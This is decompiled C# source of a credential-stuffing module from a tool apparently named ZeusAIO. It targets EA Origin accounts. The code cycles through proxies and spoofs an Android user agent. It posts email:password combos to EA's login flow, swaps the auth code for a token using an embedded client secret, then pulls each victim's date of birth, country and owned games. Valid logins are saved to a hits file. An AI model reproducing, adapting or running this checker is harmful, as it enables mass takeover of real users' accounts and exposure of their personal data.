// Decompiled with JetBrains decompiler
// Type: Origin.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Origin
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              HttpResponse httpResponse = httpRequest.Get("https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834");
              httpRequest.AllowAutoRedirect = true;
              string address = httpResponse["SelfLocation"];
              string str1 = "email=" + s[0] + "&password=" + s[1] + "&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on";
              string source1 = httpRequest.Post(address, str1, "application/x-www-form-urlencoded").ToString();
              if (!source1.Contains("Your credentials are incorrect"))
              {
                if (source1.Contains("latestSuccessLogin"))
                {
                  string str2 = Check.Parse(source1, "fid=", "\";");
                  string str3 = Check.Parse(httpRequest.Get("https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=" + str2)["Location"], "code=", "&id");
                  string source2 = httpRequest.Post("https://accounts.ea.com/connect/token", "grant_type=authorization_code&code=" + str3 + "&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html", "application/x-www-form-urlencoded").ToString();
                  if (source2.Contains("access_token\""))
                  {
                    string str4 = Check.Parse(source2, "access_token\" : \"", "\",");
                    httpRequest.AddHeader("Authorization", "Bearer " + str4);
                    string source3 = httpRequest.Get("https://gateway.ea.com/proxy/identity/pids/me").ToString();
                    if (source3.Contains("country\""))
                    {
                      string str5 = Check.Parse(source3, "dob\" : \"", "\",");
                      string str6 = Check.Parse(source3, "country\" : \"", "\",");
                      string str7 = Check.Parse(source3, "pidId\" : ", ",");
                      httpRequest.AddHeader("Accept", "application/vnd.origin.v2+json");
                      httpRequest.AddHeader("AuthToken", str4);
                      httpRequest.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)");
                      string self = httpRequest.Get("https://api1.origin.com/ecommerce2/basegames/" + str7 + "?machine_hash=17524622993368447356").ToString();
                      List<string> stringList = new List<string>();
                      if (self.Contains("offerPath\" : \"/"))
                      {
                        foreach (string substring in self.Substrings("offerPath\" : \"/", "\","))
                          stringList.Add(substring.ToString());
                        string str8 = string.Join(" |game| ", (IEnumerable<string>) stringList);
                        if (mainmenu.p1 == "2")
                          Colorful.Console.WriteLine("[Hit - Origin] " + s[0] + ":" + s[1] + " | Country: " + str6 + " | Dob: " + str5 + " | Games: " + str8, Color.Green);
                        ++mainmenu.hits;
                        Export.AsResult("/Origin_hits", s[0] + ":" + s[1] + " | Country: " + str6 + " | Dob: " + str5 + " | Games: " + str8);
                        return false;
                      }
                    }
                    break;
                  }
                  break;
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
